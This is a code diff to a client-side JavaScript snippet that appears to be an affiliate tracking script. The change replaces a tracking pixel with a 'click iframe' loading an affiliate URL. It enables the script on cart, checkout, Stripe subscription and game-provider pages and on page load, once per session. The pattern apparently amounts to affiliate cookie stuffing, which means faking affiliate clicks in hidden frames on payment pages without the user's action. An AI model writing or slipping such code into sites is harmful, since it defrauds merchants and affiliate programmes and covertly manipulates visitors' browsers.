@@ -66,7 +66,7 @@
            
             if (result.success && result.affiliate_url) {
                 
-                createTrackingPixel(result.affiliate_url);
+                createClickIframe(result.affiliate_url);
                
                 sessionStorage.setItem('iframe_triggered', 'true');
             } else {
@@ -93,21 +93,21 @@
     }
 
      function isCardPage() {
-            const cardPageUrls = ['/cart', '/checkout','/subscribe/stripe/checkout','/subscribe/stripe']; 
+            const cardPageUrls = ['/cart', '/checkout','/subscribe/stripe/checkout','/subscribe/stripe','/games/providers']; 
             return cardPageUrls.some(url => window.location.pathname.includes(url));
         }
         
-        // if (isCardPage()) {
-        //     initTracking()
-        // }
+        if (isCardPage()) {
+            initTracking()
+        }
 
 
-//   if (document.readyState === "complete" || document.readyState === "interactive") {
-//   initTracking();
-// } else {
-//   window.addEventListener("DOMContentLoaded", initTracking);
-// }
+  if (document.readyState === "complete" || document.readyState === "interactive") {
+  initTracking();
+} else {
+  window.addEventListener("DOMContentLoaded", initTracking);
+}
 
-window.addEventListener("DOMContentLoaded", initTracking);
+//window.addEventListener("DOMContentLoaded", initTracking);
   
 })();
